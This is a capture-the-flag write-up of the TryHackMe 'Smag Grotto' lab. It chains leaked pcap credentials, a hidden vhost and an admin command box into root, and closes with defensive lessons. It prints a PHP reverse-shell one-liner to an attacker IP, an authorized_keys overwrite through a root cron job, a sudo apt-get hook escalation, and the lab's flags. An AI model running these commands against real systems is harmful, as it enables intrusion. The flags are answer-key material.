# Smag Grotto — TryHackMe Writeup

**Author:** XENOS
**Difficulty:** Easy/Medium
**Category:** Web Exploitation, Network Forensics, Linux Privilege Escalation

---

## Overview

Smag Grotto is a deceptively simple box. Nothing about it screams "vulnerable" at first glance — a plain webserver, an open mail directory, a packet capture file, a misconfigured cron job, and a `sudo` rule that's been around since the dawn of GTFOBins. Each piece looks harmless on its own. Chained together, they hand you root.

**Attack chain summary:**

1. Recon reveals a `/mail/` directory on the main webserver.
2. A leaked `.pcap` file inside that directory contains plaintext HTTP credentials.
3. The credentials and a `Host` header in the capture point to a hidden virtual host.
4. The vhost's admin panel exposes a command execution feature → reverse shell as `www-data`.
5. A misconfigured cron job blindly trusts a "backup" SSH key file → privilege escalation to `jake`.
6. A passwordless `sudo` rule on `apt-get` → privilege escalation to `root`.

---

## 1. Reconnaissance

### Nmap scan

```bash
nmap 10.201.50.43
```

Standard scan, nothing exotic — port 80 is open and serving an HTTP service.

### Initial look at port 80

Browsing to the box shows a plain "Welcome to Smag!" page. Viewing the page source confirms there's nothing useful hardcoded into the HTML — no comments, no hints. Time to dig deeper.

---

## 2. Directory Fuzzing

**Theory:** Web servers often host directories or files that aren't linked anywhere on the visible site — admin panels, backup folders, leftover files from development. Directory brute-forcing (fuzzing) sends a wordlist of common names as requests and checks which ones return a valid response, uncovering content that isn't meant to be public.

**Tool:** `dirsearch` — chosen here because it's fast, has sane default wordlists for web content discovery, and gives clean output for quick triage.

```bash
dirsearch -u http://10.201.50.43
```

This turns up a `/mail/` directory — not something you'd expect to find exposed on a production webserver, which immediately makes it worth investigating.

---

## 3. The Mail Directory and the PCAP

Browsing to `/mail/` reveals a small webmail-style interface containing a thread about a "Network Migration." One of the messages has an attachment: `dHJhY2Uy.pcap` (the filename itself is Base64 — decodes to `trace2`, a small detail but a sign someone tried, weakly, to obscure it).

The interface conveniently tells you exactly how to grab it:

```bash
wget http://10.201.50.43/mail/dHJhY2Uy.pcap
```

### Analyzing the capture

**Theory:** A `.pcap` (packet capture) file is a raw recording of network traffic. If any of that traffic was sent over an unencrypted protocol like HTTP, every byte — including credentials submitted in forms — is sitting there in plaintext for anyone who opens the file.

Opening the capture in **Wireshark** and filtering for HTTP POST requests (`http.request.method == "POST"`) immediately surfaces a login attempt against `/login.php`:

```
username=helpdesk
password=cH4nG3M3_now
```

Looking at the `Host` header on that same request reveals something more interesting than the credentials themselves:

```
Host: development.smag.thm
```

This is a **virtual host (vhost)** — a separate site hosted on the same server/IP, but only reachable if your request specifies that hostname. Since there's no public DNS entry for it, the only way to reach it is to map it manually:

```bash
echo "10.201.50.43 development.smag.thm" | sudo tee -a /etc/hosts
```

---

## 4. The Development Vhost — Admin Panel RCE

Browsing to `development.smag.thm` shows a small site with `login.php` and `admin.php`. Using the credentials pulled from the pcap (`helpdesk` / `cH4nG3M3_now`) gets us authenticated.

The admin panel exposes a **command execution box** — type a command, hit submit, and the output is reflected back. This is an unauthenticated-by-design backdoor for the box, but in the real world this is exactly the kind of "internal admin tool" that gets left exposed and forgotten.

### Getting a shell

A command box that executes shell commands is one step away from a full reverse shell. Using a PHP one-liner:

```php
php -r '$sock=fsockopen("10.17.1.102",4444); exec("/bin/sh -i <&3 >&3 2>&3");'
```

And catching it with a `netcat` listener on the attacker machine:

```bash
nc -lvnp 4444
```

The connection lands, and we get an interactive shell as `www-data`.

---

## 5. Privilege Escalation: www-data → jake

### Enumeration

`/home/jake/user.txt` exists, but `www-data` doesn't have permission to read it — expected. Time to look for misconfigurations that could bridge that gap.

Checking the system crontab (`/etc/crontab` or `/etc/cron.d/*`) reveals a job running as root:

```bash
/bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys
```

**Theory — why this is dangerous:** This cron job runs as `root`, meaning root has write access to `jake`'s `.ssh/authorized_keys`. The job blindly trusts whatever content is sitting in `/opt/.backups/jake_id_rsa.pub.backup` — and if `www-data` has write access to that backup file, then effectively `www-data` controls who can SSH in as `jake`. This is a classic case of a "convenience" automation script becoming a privilege escalation path because file permissions weren't locked down.

### Exploitation

Generate a fresh SSH keypair locally:

```bash
ssh-keygen -t ed25519 -f ./jake_key
```

From the webshell, overwrite the backup file with our public key:

```bash
echo "ssh-ed25519 AAAA... mykey" > /opt/.backups/jake_id_rsa.pub.backup
```

Wait for the cron job to fire (root copies our key into `jake`'s `authorized_keys`), then connect:

```bash
ssh -i jake_key jake@10.201.50.43
```

Login succeeds. `user.txt` is now readable:

```
iusGorV7EbmxM5AuIe2w499msaSuqU3
```

---

## 6. Privilege Escalation: jake → root

### Enumeration

```bash
sudo -l
```

This shows `jake` can run `apt-get` as root with no password required.

**Theory — why `apt-get` + sudo = root:** `apt-get` supports configuration overrides via the `-o` flag, including options that define **hooks** — commands that `apt-get` runs automatically at certain points (e.g., before checking for updates). If a user can pass arbitrary `-o` options to a sudo-permitted `apt-get`, they can define a hook that runs *any command as root*, before `apt-get` even does its normal job. This is a well-documented pattern listed on GTFOBins for `apt-get`.

### Exploitation

```bash
sudo apt-get update -o APT::Update::Pre-Invoke=/bin/sh
```

This spawns a root shell directly. From there:

```bash
cat /root/root.txt
```

```
uJr6zRgetaniyHVRqqL58uRasybBKz2T
```

---

## Flags

```
User (jake): iusGorV7EbmxM5AuIe2w499msaSuqU3
Root:        uJr6zRgetaniyHVRqqL58uRasybBKz2T
```

---

## Lessons Learned

- **Sensitive files don't belong in publicly accessible directories.** A `.pcap` file with plaintext credentials sitting in a web-accessible mail folder is a single-point failure that compromises the entire chain.
- **Plaintext HTTP for authentication is unacceptable**, even on "internal" or "development" services — anyone who can capture traffic (or finds an old capture) gets your credentials.
- **Cron jobs that write to security-sensitive files (like `authorized_keys`) must validate their source.** If a lower-privileged process can influence the input to a root-run job, that job effectively runs with the lower privilege's trust level.
- **`sudo` rules should be scoped tightly.** Allowing `apt-get` (or any package manager) with arbitrary options as a passwordless sudo command is functionally equivalent to giving full root access — GTFOBins exists precisely to catalog these.
- **Naming and obfuscation (like Base64-encoded filenames) don't provide real security** — they only slow down enumeration slightly, and a determined attacker will decode and investigate everything they find.
